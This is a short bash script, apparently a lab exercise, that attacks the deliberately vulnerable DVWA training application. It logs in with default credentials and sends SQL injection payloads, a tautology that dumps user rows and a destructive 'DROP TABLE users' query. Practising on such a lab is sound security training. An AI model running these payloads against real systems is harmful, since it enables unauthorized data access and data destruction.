#!/bin/bash

TARGET="INSERT DVWA IP HERE:8080"
USERNAME="admin"
PASSWORD="password"
COOKIE_JAR="/tmp/dvwa_cookies.txt"

echo "=== Logging into DVWA ==="
curl -s -c "$COOKIE_JAR" "http://$TARGET/login.php" > /dev/null

curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -d "username=$USERNAME&password=$PASSWORD&Login=Login" \
  "http://$TARGET/login.php" > /dev/null

PHPSESSID=$(grep PHPSESSID "$COOKIE_JAR" | awk '{print $NF}')
echo "Got PHPSESSID: $PHPSESSID"

echo "=== SQL Injection Attacks ==="

curl -s "http://$TARGET/vulnerabilities/sqli/?id=1%27+OR+1%3D1--+" \
  -b "PHPSESSID=$PHPSESSID; security=low" | grep -i user

curl -s "http://$TARGET/vulnerabilities/sqli/?id=1%3B+DROP+TABLE+users--" \
  -b "PHPSESSID=$PHPSESSID; security=low" | grep -i error
